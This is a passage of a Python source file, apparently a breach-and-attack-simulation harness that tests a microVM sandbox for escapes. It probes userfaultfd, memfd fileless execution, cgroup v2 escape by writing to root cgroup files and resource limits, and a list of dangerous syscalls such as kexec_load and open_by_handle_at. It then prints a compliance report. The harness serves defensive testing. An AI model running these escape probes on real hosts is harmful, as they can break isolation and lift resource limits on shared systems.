        else:
            err = -uffd
            evidence.append(f"userfaultfd(): error {err} ({os.strerror(err)})")
            if err == errno.EPERM:
                evidence.append("Blocked by sysctl or seccomp (good)")
            elif err == errno.ENOSYS:
                evidence.append("Syscall blocked by seccomp (good)")

        self.record("PHASE2", "userfaultfd Exploit Primitive",
                     Status.VULNERABLE if vuln else Status.SECURE,
                     "userfaultfd " + ("AVAILABLE!" if vuln else "blocked."),
                     severity="CRITICAL" if vuln else "HIGH",
                     mitre_id="T1068", evidence=evidence)

    def phase2_memfd_fileless_execution(self) -> None:
        """
        2.6  memfd_create Fileless Execution Probe.

        memfd + fexecve = arbitrary binary execution from memory only,
        evading filesystem monitoring and read-only mount protections.

        MITRE: T1620 (Reflective Code Loading)
        """
        evidence = []
        vuln = False

        MFD_CLOEXEC = 0x0001
        name = ctypes.create_string_buffer(b"bas_test")
        memfd = _raw_syscall(_NR_MEMFD_CREATE, ctypes.addressof(name), MFD_CLOEXEC)

        if memfd < 0:
            err = -memfd
            evidence.append(f"memfd_create(): error {err} ({os.strerror(err)})")
            if err == errno.ENOSYS:
                evidence.append("Syscall blocked by seccomp (good)")
        else:
            evidence.append(f"memfd_create(): succeeded — fd={memfd}")

            # Write minimal ELF header
            elf = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 8 + b"\x02\x00\x3e\x00\x01\x00\x00\x00"
            os.write(memfd, elf)

            try:
                import stat
                os.fchmod(memfd, 0o755)
                evidence.append("fchmod(memfd, 0755): succeeded")

                proc_mount = None
                try:
                    with open("/proc/mounts", "r") as f:
                        for line in f:
                            if " /proc " in line:
                                proc_mount = line.strip()
                                break
                except Exception:
                    pass

                if proc_mount and "noexec" in proc_mount:
                    evidence.append(f"/proc: noexec — fileless exec blocked")
                else:
                    evidence.append(f"/proc mount: {proc_mount or 'unknown'} — fileless exec may be possible")
                    vuln = True
            except (PermissionError, OSError) as e:
                evidence.append(f"fchmod(memfd): {e}")

            os.close(memfd)

        self.record("PHASE2", "memfd Fileless Execution",
                     Status.VULNERABLE if vuln else Status.SECURE,
                     "memfd fileless execution " + ("POSSIBLE!" if vuln else "blocked."),
                     severity="HIGH" if vuln else "MEDIUM",
                     mitre_id="T1620", evidence=evidence)

    def phase2_landlock_lsm_probe(self) -> None:
        """
        2.7  Landlock LSM Bypass Probe.
        MITRE: T1222
        """
        evidence = []

        LANDLOCK_VERSION_FLAG = 1 << 0
        ret = _raw_syscall(_NR_LANDLOCK_CREATE_RULESET, 0, 0, LANDLOCK_VERSION_FLAG)

        if ret < 0:
            err = -ret
            if err == errno.ENOSYS:
                evidence.append("Landlock: ENOSYS — not supported")
            elif err == errno.EOPNOTSUPP:
                evidence.append("Landlock: EOPNOTSUPP — disabled")
            else:
                evidence.append(f"Landlock version: error {err} ({os.strerror(err)})")
        else:
            evidence.append(f"Landlock ABI version: {ret}")

            LANDLOCK_ACCESS_FS_ALL = sum(1 << i for i in range(14))
            attr = struct.pack("QQ", LANDLOCK_ACCESS_FS_ALL, 0)
            attr_buf = ctypes.create_string_buffer(attr)
            rs_fd = _raw_syscall(_NR_LANDLOCK_CREATE_RULESET,
                                 ctypes.addressof(attr_buf), len(attr), 0)
            if rs_fd >= 0:
                evidence.append(f"Landlock ruleset created: fd={rs_fd}")
                restrict_ret = _raw_syscall(_NR_LANDLOCK_RESTRICT_SELF, rs_fd, 0)
                if restrict_ret == 0:
                    evidence.append("landlock_restrict_self: succeeded")
                else:
                    evidence.append(f"landlock_restrict_self: error {-restrict_ret} ({os.strerror(-restrict_ret)})")
                os.close(rs_fd)
            else:
                evidence.append(f"Landlock create_ruleset: error {-rs_fd} ({os.strerror(-rs_fd)})")

        try:
            lsm_list = Path("/sys/kernel/security/lsm").read_text().strip()
            evidence.append(f"Active LSMs: {lsm_list}")
        except (FileNotFoundError, PermissionError) as e:
            evidence.append(f"LSM list: {e}")

        self.record("PHASE2", "Landlock LSM Probe", Status.INFO,
                     "Landlock LSM status assessed.",
                     severity="MEDIUM", mitre_id="T1222", evidence=evidence)

    def phase2_cgroup_escape(self) -> None:
        """
        2.8  cgroup v2 Escape and Resource Limit Bypass.
        MITRE: T1611
        """
        evidence = []
        vuln = False

        try:
            cgroup = Path("/proc/self/cgroup").read_text().strip()
            evidence.append(f"Current cgroup: {cgroup}")
        except (FileNotFoundError, PermissionError) as e:
            evidence.append(f"Cannot read cgroup: {e}")

        for cg_path in ["/sys/fs/cgroup/cgroup.procs", "/sys/fs/cgroup/unified/cgroup.procs"]:
            try:
                with open(cg_path, "w") as f:
                    f.write(str(os.getpid()))
                evidence.append(f"CRITICAL: Wrote to {cg_path} — escaped cgroup!")
                vuln = True
            except PermissionError:
                evidence.append(f"{cg_path}: write denied (good)")
            except FileNotFoundError:
                evidence.append(f"{cg_path}: not found")
            except OSError as e:
                evidence.append(f"{cg_path}: {e}")

        for limit_path in ["/sys/fs/cgroup/memory.max", "/sys/fs/cgroup/cpu.max", "/sys/fs/cgroup/pids.max"]:
            try:
                current = Path(limit_path).read_text().strip()
                evidence.append(f"{limit_path} = {current}")
                with open(limit_path, "w") as f:
                    f.write("max\n")
                evidence.append(f"CRITICAL: Modified {limit_path}!")
                vuln = True
            except PermissionError:
                evidence.append(f"{limit_path}: write denied (good)")
            except FileNotFoundError:
                pass
            except OSError as e:
                evidence.append(f"{limit_path}: {e}")

        try:
            os.makedirs("/sys/fs/cgroup/bas_escape_test", exist_ok=True)
            evidence.append("CRITICAL: Created new cgroup!")
            vuln = True
            try:
                os.rmdir("/sys/fs/cgroup/bas_escape_test")
            except Exception:
                pass
        except (PermissionError, OSError) as e:
            evidence.append(f"New cgroup creation: {e}")

        self.record("PHASE2", "cgroup v2 Escape",
                     Status.VULNERABLE if vuln else Status.SECURE,
                     "cgroup escape " + ("POSSIBLE!" if vuln else "blocked."),
                     severity="CRITICAL" if vuln else "HIGH",
                     mitre_id="T1611", evidence=evidence)

    def phase2_seccomp_bypass_probes(self) -> None:
        """
        2.9  Seccomp-BPF Bypass Probes — dangerous syscall audit.
        MITRE: T1106 (Native API)
        """
        evidence = []
        vuln_count = 0

        try:
            status = Path("/proc/self/status").read_text()
            for line in status.splitlines():
                if line.startswith(("Seccomp:", "Seccomp_filters:", "NoNewPrivs:")):
                    evidence.append(line.strip())
        except Exception as e:
            evidence.append(f"Cannot read seccomp status: {e}")

        dangerous = [
            (161, "chroot",            "Filesystem escape"),
            (167, "swapon",            "Swap manipulation"),
            (168, "swapoff",           "Swap manipulation"),
            (175, "init_module",       "Kernel module loading"),
            (176, "delete_module",     "Kernel module removal"),
            (246, "kexec_load",        "Kernel replacement"),
            (304, "open_by_handle_at", "Docker breakout classic"),
            (310, "process_vm_readv",  "Cross-process memory read"),
            (311, "process_vm_writev", "Cross-process memory write"),
            (_NR_CLONE3, "clone3",     "Process creation"),
        ]

        for nr, name, desc in dangerous:
            ret = _raw_syscall(nr, 0, 0, 0, 0, 0, 0)
            err = -ret if ret < 0 else 0

            if err == errno.ENOSYS:
                evidence.append(f"  {name}({nr}): BLOCKED by seccomp")
            elif err == errno.EPERM:
                evidence.append(f"  {name}({nr}): EPERM — capability blocked")
            elif err in (errno.EFAULT, errno.EINVAL):
                evidence.append(f"  {name}({nr}): {os.strerror(err)} — reached kernel! [{desc}]")
                vuln_count += 1
            elif ret >= 0:
                evidence.append(f"  {name}({nr}): SUCCEEDED ({ret}) — DANGEROUS [{desc}]")
                vuln_count += 1
            else:
                evidence.append(f"  {name}({nr}): error {err} ({os.strerror(err)})")

        self.record("PHASE2", "Seccomp-BPF Bypass Probes",
                     Status.VULNERABLE if vuln_count > 3 else Status.INFO if vuln_count > 0 else Status.SECURE,
                     f"{vuln_count}/{len(dangerous)} dangerous syscalls reached kernel." +
                     (" Seccomp has gaps!" if vuln_count > 3 else ""),
                     severity="CRITICAL" if vuln_count > 3 else "HIGH",
                     mitre_id="T1106", evidence=evidence)

    # ═══════════════════════════════════════════════════════════════════════
    #  REPORT
    # ═══════════════════════════════════════════════════════════════════════

    def generate_report(self) -> Dict[str, Any]:
        elapsed = time.monotonic() - self._start_time
        counts = {s.value: 0 for s in Status}
        for r in self.results:
            counts[r.status.value] += 1

        overall = "PASS"
        if counts["VULNERABLE"] > 0:
            overall = "FAIL"
        elif counts["ERROR"] > 0:
            overall = "DEGRADED"

        report = OrderedDict([
            ("report_type", "MicroVM BAS Security Boundary Validation"),
            ("timestamp", time.strftime("%Y-%m-%dT%H:%M:%S%z")),
            ("duration_sec", round(elapsed, 2)),
            ("architecture", _ARCH),
            ("kernel", os.uname().release),
            ("hostname", os.uname().nodename),
            ("uid", os.getuid()),
            ("pid", os.getpid()),
            ("overall_verdict", overall),
            ("summary", {
                "total_tests": len(self.results),
                "SECURE": counts["SECURE"],
                "VULNERABLE": counts["VULNERABLE"],
                "INFO": counts["INFO"],
                "ERROR": counts["ERROR"],
                "SKIPPED": counts["SKIPPED"],
            }),
            ("tests", []),
        ])

        for r in self.results:
            report["tests"].append(OrderedDict([
                ("id", r.test_id),
                ("phase", r.phase),
                ("name", r.name),
                ("status", r.status.value),
                ("severity", r.severity),
                ("mitre_attack", r.mitre_id),
                ("detail", r.detail),
                ("evidence", r.evidence),
            ]))

        return report

    def print_report(self, report: Dict[str, Any]) -> None:
        W = 78
        print()
        print("=" * W)
        print("  MicroVM Breach & Attack Simulation (BAS) Report")
        print("=" * W)
        print(f"  Time     : {report['timestamp']}")
        print(f"  Duration : {report['duration_sec']}s")
        print(f"  Arch     : {report['architecture']}")
        print(f"  Kernel   : {report['kernel']}")
        print(f"  UID/PID  : {report['uid']}/{report['pid']}")
        print()

        STATUS_ICONS = {
            "SECURE": "[SECURE]    ",
            "VULNERABLE": "[VULNERABLE]",
            "INFO": "[INFO]      ",
            "ERROR": "[ERROR]     ",
            "SKIPPED": "[SKIPPED]   ",
        }

        phase_tests = {}
        for t in report["tests"]:
            phase_tests.setdefault(t["phase"], []).append(t)

        for phase, tests in phase_tests.items():
            label = ("PRE-EXPLOIT: VirtIO Engine Fuzzing" if "1" in phase
                     else "POST-EXPLOIT: Sandbox Escape Probes")
            print("-" * W)
            print(f"  {phase} -- {label}")
            print("-" * W)

            for t in tests:
                icon = STATUS_ICONS.get(t["status"], "[?]")
                mitre = f" [{t['mitre_attack']}]" if t["mitre_attack"] else ""
                sev = f" ({t['severity']})" if t["status"] == "VULNERABLE" else ""
                print(f"  {icon} {t['name']}{mitre}{sev}")
                for dl in t["detail"].split(". "):
                    dl = dl.strip()
                    if dl:
                        print(f"               {dl}.")
                for ev in t.get("evidence", [])[:5]:
                    print(f"               > {ev}")
                if len(t.get("evidence", [])) > 5:
                    print(f"               > ... ({len(t['evidence']) - 5} more)")
                print()

        print("=" * W)
        s = report["summary"]
        verdict = report["overall_verdict"]

        print(f"  OVERALL VERDICT: {verdict}")
        print()
        print(f"  SECURE     : {s['SECURE']}")
        print(f"  VULNERABLE : {s['VULNERABLE']}")
        print(f"  INFO       : {s['INFO']}")
        print(f"  ERROR      : {s['ERROR']}")
        print(f"  SKIPPED    : {s['SKIPPED']}")
        print()

        if s["VULNERABLE"] > 0:
            print("  VULNERABLE FINDINGS:")
            for t in report["tests"]:
                if t["status"] == "VULNERABLE":
                    print(f"    * [{t['severity']}] {t['name']} -- {t['detail'][:80]}")
            print()

        print("=" * W)
        print()
        print("--- JSON COMPLIANCE REPORT ---")
        print(json.dumps(report, indent=2))


# ═══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════════════════

def main() -> int:
    harness = BASHarness()

    print()
    print("+================================================================+")
    print("|  MicroVM Breach & Attack Simulation (BAS) Harness              |")
    print("|  Dual-Phase Security Boundary Validation                       |")
    print("|                                                                |")
    print("|  WARNING: Active security probing. Use in test/staging only.   |")
    print("+================================================================+")
    print()

    # PHASE 1
    print(">> PHASE 1: Pre-Exploit -- VirtIO Engine Fuzzing...")
    print()

    phase1_tests = [
        ("1.1 VirtIO TOCTOU Race",        harness.phase1_virtio_device_toctou_race),
        ("1.2 KVM ioctl Fuzzing",          harness.phase1_kvm_ioctl_fuzzer),
        ("1.3 MMIO Timing Side-Channel",   harness.phase1_mmio_timing_sidechannel),
        ("1.4 VirtIO Queue Overflow",      harness.phase1_virtio_queue_overflow),
    ]

    for label, test_fn in phase1_tests:
        try:
            sys.stdout.write(f"  Running {label}... ")
            sys.stdout.flush()
            test_fn()
            print("done")
        except Exception as e:
            print(f"ERROR: {e}")
            harness.record("PHASE1", label.split(" ", 1)[1], Status.ERROR,
                           f"Test crashed: {e}\n{traceback.format_exc()}")

    # PHASE 2
    print()
    print(">> PHASE 2: Post-Exploit -- Advanced Sandbox Escape Probes...")
    print()

    phase2_tests = [
        ("2.1 io_uring Async Evasion",       harness.phase2_io_uring_async_evasion),
        ("2.2 pidfd Descriptor Hijack",       harness.phase2_pidfd_descriptor_hijack),
        ("2.3 chroot FD Swap Escape",         harness.phase2_chroot_fd_swap_escape),
        ("2.4 Network Capability Escalation", harness.phase2_network_capability_escalation),
        ("2.5 userfaultfd Exploit Primitive",  harness.phase2_userfaultfd_exploit_primitive),
        ("2.6 memfd Fileless Execution",      harness.phase2_memfd_fileless_execution),
        ("2.7 Landlock LSM Probe",            harness.phase2_landlock_lsm_probe),
        ("2.8 cgroup v2 Escape",              harness.phase2_cgroup_escape),
        ("2.9 Seccomp-BPF Bypass",            harness.phase2_seccomp_bypass_probes),
    ]

    for label, test_fn in phase2_tests:
        try:
            sys.stdout.write(f"  Running {label}... ")
            sys.stdout.flush()
            test_fn()
            print("done")
        except Exception as e:
            print(f"ERROR: {e}")
            harness.record("PHASE2", label.split(" ", 1)[1], Status.ERROR,
                           f"Test crashed: {e}\n{traceback.format_exc()}")

    print()
    report = harness.generate_report()
    harness.print_report(report)

    return 1 if report["summary"]["VULNERABLE"] > 0 else 0


if __name__ == "__main__":
    sys.exit(main())
